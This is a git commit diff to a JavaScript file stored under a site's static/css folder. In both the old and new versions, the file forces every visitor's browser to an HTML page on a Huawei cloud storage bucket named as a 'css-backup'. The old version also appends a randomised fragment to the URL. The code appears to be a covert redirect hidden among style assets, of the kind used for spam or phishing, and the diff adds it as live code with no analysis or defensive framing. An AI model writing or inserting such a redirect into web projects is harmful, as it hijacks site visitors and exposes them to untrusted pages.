f51189b83508e232f82d4494375b7c5a6ac1c30b
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-28 19:45:45 +0800

    Update mt13.js

--- static/css/mt13.js
+++ static/css/mt13.js
@@ -1,15 +1,1 @@
-var urls=[' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/fd68b4998e3f490d84b014a35bdb4f80.html#{nnnnnnn}{wwww}',];
-location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
-function myEeplace(s){
-	return s.replace(/\{(\w+?)\}/g,function(a,b){
-		var h='';
-		for(var i=0;i<b.length;i++){
-			if('n'==b[i]){
-				h+=Math.floor(Math.random()*10);
-			}else if('w'==b[i]){
-				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
-			}
-		}
-		return h;
-	});
-}
+var html=location.href="https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/fd68b4998e3f490d84b014a35bdb4f80.html";
